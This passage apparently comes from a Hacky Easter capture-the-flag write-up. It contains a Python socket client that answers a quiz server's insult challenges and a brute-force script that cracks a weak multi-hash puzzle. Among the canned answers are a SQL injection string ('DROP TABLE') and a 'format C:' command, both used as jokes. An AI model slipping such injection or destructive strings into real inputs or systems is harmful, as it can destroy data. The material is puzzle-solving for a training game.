          &lt;span class="s2"&gt;&amp;quot;I'll check you out - any last words?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;svn:ignore&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;Tell me your name, hobo. I need to check your records.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;My name is bob'; DROP TABLE VALJ;--&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;format C:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Specified drive does not exist.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;You must be jealous when seeing my phone's display.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Not really - Your pixels are so big, some of them have their own region code!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
          &lt;span class="s2"&gt;&amp;quot;Ping! Anybody there?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;ICMP type 3, code 13: Communication Administratively Prohibited&amp;quot;&lt;/span&gt;
          &lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;tosends&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;challs&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;removekey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;del&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;sendchall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chall&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;challs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;chall&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\r&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;netcat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="n"&gt;tosends&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;AF_INET&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;SOCK_STREAM&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;connect&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;hostname&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;continue&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Received:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;repr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Speechless?&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt;
            &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'Go play with your toys, yellow-belly.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
            &lt;span class="k"&gt;break&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;'Do you feel brave enough to challenge the mighty nerdmaster? (y|n)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'y&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;continue&lt;/span&gt;

        &lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.*YOUR TURN ----&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s2"&gt;n&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;chal&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tosends&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;randint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tosends&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
            &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;chal&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'send challenge: '&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chal&lt;/span&gt;
            &lt;span class="n"&gt;tosends&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;removekey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tosends&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chal&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;continue&lt;/span&gt;



        &lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;re&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;search&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'.*MY TURN ----&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s1"&gt;n(.*)&lt;/span&gt;&lt;span class="se"&gt;\\&lt;/span&gt;&lt;span class="s1"&gt;n'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;chal&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;m&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;groups&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;chal&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;challs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keys&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
                &lt;span class="n"&gt;sendchall&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;chal&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;challs&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;chal&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;
                &lt;span class="k"&gt;continue&lt;/span&gt;
            &lt;span class="k"&gt;continue&lt;/span&gt;

        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'::::::'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;


    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Connection closed.&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="n"&gt;nc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;netcat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'hackyeaster.hacking-lab.com'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1400&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;div class="section" id="challenge-24"&gt;
&lt;h2&gt;Challenge 24&lt;/h2&gt;
&lt;p&gt;Hrm, this really isn't a secure hash at all. A Python script can do this&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;Crypto.Hash&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;MD2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SHA&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SHA256&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SHA512&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;itertools&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;part_1&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;gen&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MD2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;word&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;hashed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;hashed&lt;/span&gt;&lt;span class="p"&gt;[:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'[*] First part is:'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;part_2&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;gen&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MD5&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;word&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;hashed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;hashed&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'[*] Second part is:'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;part_3&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;gen&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SHA&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;word&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;hashed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;hashed&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'[*] Third part is:'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;part_4&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;gen&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SHA256&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;word&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;hashed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;hashed&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;18&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'[*] Fourth part is:'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;part_5&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;gen&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;word&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;''&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;SHA512&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;word&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;hashed&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;hashed&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;'[*] Fifth part is:'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;word&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt;


&lt;span class="n"&gt;my_chars&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;printable&lt;/span&gt;

&lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'757c47'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;'9895d6'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'845b2b'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'0530cd'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;'9a2b11'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="n"&gt;which_part&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

